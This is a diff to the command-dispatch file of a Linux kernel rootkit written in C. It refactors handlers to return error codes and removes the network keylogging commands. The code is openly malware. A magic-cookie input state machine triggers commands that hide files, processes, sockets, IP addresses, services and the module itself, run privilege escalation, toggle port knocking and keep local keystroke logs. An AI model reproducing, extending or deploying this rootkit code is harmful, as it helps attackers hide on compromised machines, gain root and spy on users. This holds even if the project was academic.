@@ -24,11 +24,11 @@
 #include <linux/inet.h>
  
 #include "control.h"
-#include "include.h"
-#include "privilege_escalation.h"
-#include "net_keylog.h"
-#include "hide_module.h"
 #include "covert_communication.h"
+#include "include.h"
+#include "hide_module.h"
+#include "privilege_escalation.h"
+#include "read.h"
 
 static int state = 0;
 static int cstate = 0;
@@ -49,112 +49,85 @@ execute_command (void)
 	
 	u8 tmp[4];
 
-	if(strcmp(command_buffer, "enable_netlog") == 0) {
-		if(param_counter > 0) {
-			enable_net_keylog(param_buffer);
-		}
-		
-	} else if(strcmp(command_buffer, "disable_netlog") == 0) {
-		disable_net_keylog();
-		
-	} else if(strcmp(command_buffer, "hide_file") == 0) {
-		if(param_counter > 0) {
-			hide_file_path(param_buffer);
-		}
-		
+	int ret = -EINVAL;
+
+	if(strcmp(command_buffer, "hide_file") == 0) {
+		if(param_counter > 0)
+			ret = hide_file_path(param_buffer);
 	} else if(strcmp(command_buffer, "unhide_file") == 0) {
-		if(param_counter > 0) {
-			unhide_file_path(param_buffer);
-		}
-		
+		if(param_counter > 0)
+			ret = unhide_file_path(param_buffer);
 	} else if(strcmp(command_buffer, "hide_fprefix") == 0) {
-		if(param_counter > 0) {
-			hide_file_prefix(param_buffer);
-		}
-		
+		if(param_counter > 0)
+			ret = hide_file_prefix(param_buffer);
 	} else if(strcmp(command_buffer, "unhide_fprefix") == 0) {
-		if(param_counter > 0) {
-			unhide_file_prefix(param_buffer);
-		}
-		
+		if(param_counter > 0)
+			ret = unhide_file_prefix(param_buffer);
 	} else if(strcmp(command_buffer, "hide_process") == 0) {
 		if(param_counter > 0) {
 			pid = convert_atoi(param_buffer);
-			hide_process(pid);	
+			ret = hide_process(pid);	
 		}
-		
 	} else if(strcmp(command_buffer, "unhide_process") == 0) {
 		if(param_counter > 0) {
 			pid = convert_atoi(param_buffer);
-			unhide_process(pid);	
+			ret = unhide_process(pid);	
 		}
-		
 	} else if(strcmp(command_buffer, "hide_tcp") == 0) {
 		if(param_counter > 0) {
 			port = convert_atoi(param_buffer);
-			hide_tcp_socket(port);
+			ret = hide_tcp_socket(port);
 		}
-		
 	} else if(strcmp(command_buffer, "unhide_tcp") == 0) {
 		if(param_counter > 0) {
 			port = convert_atoi(param_buffer);
-			unhide_tcp_socket(port);
+			ret = unhide_tcp_socket(port);
 		}
-		
 	} else if(strcmp(command_buffer, "hide_udp") == 0) {
 		if(param_counter > 0) {
 			port = convert_atoi(param_buffer);
-			hide_udp_socket(port);
+			ret = hide_udp_socket(port);
 		}
-		
 	} else if(strcmp(command_buffer, "unhide_udp") == 0) {
 		if(param_counter > 0) {
 			port = convert_atoi(param_buffer);
-			unhide_udp_socket(port);
+			ret = unhide_udp_socket(port);
 		}
-		
 	} else if(strcmp(command_buffer, "enable_knocking_tcp") == 0) {
 		if(param_counter > 0) {
 			port = convert_atoi(param_buffer);
-			enable_knocking_tcp(port);
+			ret = enable_knocking_tcp(port);
 		}
-		
 	} else if(strcmp(command_buffer, "disable_knocking_tcp") == 0) {
 		if(param_counter > 0) {
 			port = convert_atoi(param_buffer);
-			disable_knocking_tcp(port);
+			ret = disable_knocking_tcp(port);
 		}
-		
 	} else if(strcmp(command_buffer, "enable_knocking_udp") == 0) {
 		if(param_counter > 0) {
 			port = convert_atoi(param_buffer);
-			enable_knocking_udp(port);
+			ret = enable_knocking_udp(port);
 		}
-		
 	} else if(strcmp(command_buffer, "disable_knocking_udp") == 0) {
 		if(param_counter > 0) {
 			port = convert_atoi(param_buffer);
-			disable_knocking_udp(port);
+			ret = disable_knocking_udp(port);
 		}
-		
 	} else if(strcmp(command_buffer, "hide_service") == 0) {
 		if(param_counter > 0) {
 			port = convert_atoi(param_buffer);
-			hide_service(port);
+			ret = hide_service(port);
 		}
-		
 	} else if(strcmp(command_buffer, "unhide_service") == 0) {
 		if(param_counter > 0) {
 			port = convert_atoi(param_buffer);
-			unhide_service(port);
+			ret = unhide_service(port);
 		}
-		
 	} else if(strcmp(command_buffer, "hide_ip") == 0) {
 		if(param_counter > 0) {
 			/* convert ip string to an int array */
-			if(in4_pton(param_buffer, -1, tmp, -1, NULL) == 0) {
+			if(in4_pton(param_buffer, -1, tmp, -1, NULL) == 0)
 				ROOTKIT_DEBUG("[func 'hide_ip'] Not a valid IP address!\n");
-			}
 
 			/* hack to convert byte array to __u32 */
 			ipaddr = 0;
@@ -166,15 +139,13 @@ execute_command (void)
 			ipaddr <<= 8;
 			ipaddr |= tmp[3] & 0xFF;
 
-			hide_ip_address(ipaddr);
+			ret = hide_ip_address(ipaddr);
 		}
-		
 	} else if(strcmp(command_buffer, "unhide_ip") == 0) {
 		if(param_counter > 0) {
 			/* convert ip string to an int array */
-			if(in4_pton(param_buffer, -1, tmp, -1, NULL) == 0) {
+			if(in4_pton(param_buffer, -1, tmp, -1, NULL) == 0)
 				ROOTKIT_DEBUG("[func 'unhide_ip'] Not a valid IP address!\n");
-			}
 
 			/* hack to convert byte array to __u32 */
 			ipaddr = 0;
@@ -186,36 +157,32 @@ execute_command (void)
 			ipaddr <<= 8;
 			ipaddr |= tmp[3] & 0xFF;
 
-			unhide_ip_address(ipaddr);
+			ret = unhide_ip_address(ipaddr);
 		}
-		
 	} else if(strcmp(command_buffer, "hide_module") == 0) {
-		if(param_counter > 0) {
-			hide_module_byname(param_buffer);
-		}
-
+		if(param_counter > 0)
+			ret = hide_module_byname(param_buffer);
 	} else if(strcmp(command_buffer, "unhide_module") == 0) {
-		if(param_counter > 0) {
-			unhide_module_byname(param_buffer);
-		}	
-
+		if(param_counter > 0)
+			ret = unhide_module_byname(param_buffer);
 	} else if(strcmp(command_buffer, "escalate") == 0) {
-		priv_escalation();
+		ret = priv_escalation();
 		ROOTKIT_DEBUG("rooted\n");
-		
-	}
-	else if(strcmp(command_buffer, "deescalate") == 0) {
-		priv_deescalation();
+	} else if(strcmp(command_buffer, "deescalate") == 0) {
+		ret = priv_deescalation();
 		ROOTKIT_DEBUG("un-rooted\n");
-	}
-	 else if(strcmp(command_buffer, "enable_filelog") == 0) {
-                enable_filelog();
+	} else if(strcmp(command_buffer, "enable_filelog") == 0) {
+                ret = enable_filelog();
                 ROOTKIT_DEBUG("Local file logging enabled\n");
-        }
-        else if(strcmp(command_buffer, "disable_filelog") == 0) {
-                disable_filelog();
+        } else if(strcmp(command_buffer, "disable_filelog") == 0) {
+                ret = disable_filelog();
                 ROOTKIT_DEBUG("Local file logging disabled\n");
-	}
+	} else 
+		ret = -ENOSYS;
+
+	if(ret < 0)
+		ROOTKIT_DEBUG("command '%s %s' failed with error code %i",
+			command_buffer, param_buffer, ret);
         
 	/* cleanup */
 	memset(command_buffer, 0, 32);
@@ -231,7 +198,6 @@ void
 accept_command_input (char input)
 {
 	if(command_counter >= 0 && command_counter < 32) {
-
 		if(input == ' ') {		/* continue with parameter */
 			command_buffer[command_counter] = '\0';
 			state = 2;
@@ -292,9 +258,12 @@ void accept_param_input (char input)
 }
 
 /* the main state-machine accepting our inputs */
-void
+int
 accept_input (char input)
 {
+	if(!control_loaded())
+		return -EPERM;
+
 	if(state == 0) {
 		
 		if(magic_cookie[cstate] == input) {
@@ -313,4 +282,6 @@ accept_input (char input)
 	} else if(state == 2) {
 		accept_param_input(input);
 	}
+	
+	return 0;
 }
